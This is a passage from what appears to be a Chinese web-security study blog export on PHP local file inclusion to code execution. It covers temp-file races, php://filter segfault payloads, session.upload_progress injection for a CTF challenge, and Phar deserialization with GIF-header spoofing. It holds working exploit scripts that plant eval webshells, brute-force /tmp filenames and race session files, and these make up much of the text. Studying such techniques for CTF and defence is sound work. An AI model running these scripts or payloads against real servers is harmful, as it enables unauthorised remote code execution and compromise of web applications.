%d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> not e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot! m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="with-php崩溃">with php崩溃</h2>
<h3 id="php-segfault">php segfault</h3>
<p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p>
<p><strong>1. php &lt; 7.2</strong></p>
<p><code>php://filter/string.strip_tags/resource=/etc/passwd</code></p>
<p><strong>2. php7 老版本通杀</strong></p>
<p><code>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></p>
<p>利用脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># php崩溃 生成大量临时文件</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">def upload_file(url, file_content):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, files=files)</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">charset = <span class="keyword">string</span>.digits+<span class="keyword">string</span>.letters</span><br><span class="line">webshell = <span class="string">&#x27;&lt;?php eval($_REQUEST[daolgts]);?&gt;&#x27;</span>.encode(<span class="string">&quot;base64&quot;</span>).strip()</span><br><span class="line">file_content = <span class="string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/daolgts&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;success&quot;;&#125;?&gt;&#x27;</span> % (webshell)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload2=r<span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">lfi_url = url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=&quot;</span>+payload1</span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i in xrange(times):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">    upload_file(lfi_url, file_content)</span><br></pre></td></tr></table></figure>
<h3 id="爆破tmp文件名">爆破tmp文件名</h3>
<p>然后爆破临时文件名来包含</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                        filename = i + j + k + l + m + n</span><br><span class="line">                        url = base_url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=/tmp/php&quot;</span>+filename</span><br><span class="line">                        <span class="keyword">print</span> url</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            response = requests.get(url)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;url:&quot;</span>+url</span><br><span class="line">                                exit()</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure>
<h2 id="session">session</h2>
<p><strong>利用条件</strong></p>
<p>session文件路径已知，且其中内容部分可控。</p>
<p><strong>利用方式</strong></p>
<blockquote>
<p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是 <code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值。</p>
</blockquote>
<p>也就是说session中会添加<code>session.upload_progress.prefix</code>+<code>$_POST[ini_get['session.upload_progress.name']]</code>,而<code>session.upload_progress.name</code>是可控的，所以就可以在session写入php代码，然后包含session文件来rce</p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>session.upload_progress+LFI实现RCE</title>
    <url>/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/</url>
    <content><![CDATA[<h1 id="PHP-session-upload-process-LFI实现RCE">PHP session.upload_process + LFI实现RCE</h1>
<blockquote>
<p>参考文章：</p>
<p><a href="https://tgaout.github.io/2019/05/29/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B8%97%E9%80%8F/">https://tgaout.github.io/2019/05/29/利用session-upload-progress进行文件包含和反序列化渗透/</a></p>
</blockquote>
<p>这篇文章主要记录参考文章的复现环节，知识点部分简单介绍。</p>
<h2 id="0x01-PHP关于upload-process配置介绍">0x01 PHP关于upload_process配置介绍</h2>
<p>本文提到的PHP配置中关于session.upload_process主要是下面四个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>enabled=on</code>表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中；</p>
</li>
<li>
<p><code>cleanup=on</code>表示上传结束后，PHP会立即清空对应的session文件中的内容；</p>
</li>
<li>
<p>关于<code>prefix</code>和<code>name</code>两个选项，PHP文档中有详细说明：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018095115.png" alt=""></p>
</li>
</ul>
<h2 id="0x02-upload-progress-文件包含实现RCE">0x02 upload_progress + 文件包含实现RCE</h2>
<h3 id="示例代码">示例代码</h3>
<p>直接从一道CTF题目入手：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:20:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ban掉了常见的文件包含伪协议，这个时候我们可以利用<code>session.upload_progress</code>将恶意代码写入session文件，从而包含session文件。</p>
<p>现在还存在两个问题：首先没有代码中没有<code>session_start()</code>如何创建session文件；第二个问题，由于<code>session.upload_progress.cleanup=on</code>，当文件上传结束后，session文件的内容被自动清除，如何进行RCE？</p>
<h3 id="session-use-strict-mode">session.use_strict_mode</h3>
<p>关于第一个问题，session还有一个默认配置：<code>session.use_strict_mode=0</code>，意思就是用户可以自定义Session ID。具体而言，我们在Cookie中设置<code>Cookie:PHPSESSID=ca01h</code>，PHP将会在服务器上session存储的位置创建一个文件<code>session_ca01h</code>，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由<code>session.upload_progress.prefix</code>+<code>session.upload_progress_name</code>组成，最后被写入sess_文件中。</p>
<h3 id="条件竞争">条件竞争</h3>
<p>为了赶在session文件被清除之前进行RCE，可以通过上传一个大文件进行条件竞争。</p>
<h3 id="解题">解题</h3>
<p>本来是想直接写一个脚本Getshell的，结果一直没能调试出来，只能用burp抓包intrude了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://7a4916f9-18d7-4ecf-bed3-302ed44c5763.chall.ctf.show/index.php&quot;&quot;&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;</span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        resp = session.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php eval($_POST);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;ca01h.txt&quot;</span>, f)&#125;, cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: sessid&#125;, proxies=proxy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid, data=data, proxies=proxy)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ca01h.txt&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[++++++]Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
<p>burp抓包</p>
<p>文件上传请求包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120147.png" alt=""></p>
<p>执行命令请求包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120341.png" alt=""></p>
<p>条件竞争爆破</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120536.png" alt=""></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>web安全学习</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP反序列化学习-Phar反序列化</title>
    <url>/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="PHP反序列化学习——Phar反序列化">PHP反序列化学习——Phar反序列化</h1>
<h2 id="Phar原理">Phar原理</h2>
<p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512093032.png" alt=""></p>
<h3 id="Phar-demo">Phar demo</h3>
<p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p>
<blockquote>
<p><strong>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p>
</blockquote>
<p>phar.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$o-&gt;data = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>访问后,会生成一个phar.phar在当前目录下。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512093829.png" alt=""></p>
<p>可以明显的看到meta-data是以序列化的形式存储的。</p>
<p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，知道创宇测试后受影响的函数列表：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512094000.png" alt=""></p>
<p>就用比较常用的函数<code>file_get_contents()</code>函数举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_get_contents(<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512112709.png" alt=""></p>
<p>至于为什么这些函数在解析phar文件时会进行反序列化操作，可以看一下zsf师傅的深层次剖析：</p>
<p><a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<p>在跟踪了受影响函数的调用情况后发现，除了所有文件函数，只要是函数的实现过程直接或间接调用了<code>php_stream_open_wrapper</code>，都可能触发phar反序列化漏洞。</p>
<h3 id="将Phar伪造成其他格式的文件">将Phar伪造成其他格式的文件</h3>
<p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;img.phar&#x27;</span>);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $phar -&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    $object = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $object -&gt; data = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">    $phar -&gt; setMetadata($object);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512113427.png" alt=""></p>
<p>采用这种方法可以绕过很大一部分上传检测。</p>
<h2 id="Phar反序列化漏洞利用">Phar反序列化漏洞利用</h2>
<h3 id="漏洞利用条件">漏洞利用条件</h3>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="Phar简单利用">Phar简单利用</h3>
<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>upload file<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Upload&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>upload.php</p>
<p>仅允许格式为gif的文件上传。上传成功的文件会存储到upload_file目录下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>evil.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $data = <span class="string">&#x27;echo &quot;Hello World&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&quot;file&quot;</span>])&#123;</span><br><span class="line">	file_exists($_GET[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>绕过思路：GIF格式验证可以通过在文件头部添加GIF89a绕过。</p>
<p>用下面的代码生成phar文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$o-&gt;data = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>生成的<code>phar.phar</code>修改后缀名<code>phar.gif</code>，再上传该文件，用phar协议解析：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200513193604.png" alt=""></p>
<h2 id="Phar反序列化实例">Phar反序列化实例</h2>
<h3 id="HITCON-2017-Baby-h-Master-PHP">[HITCON 2017]Baby^h Master PHP</h3>
<p>我们先看看Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化，毕竟这是第一次出现这种利用方式的地方，应该来说是最经典的利用场景。</p>
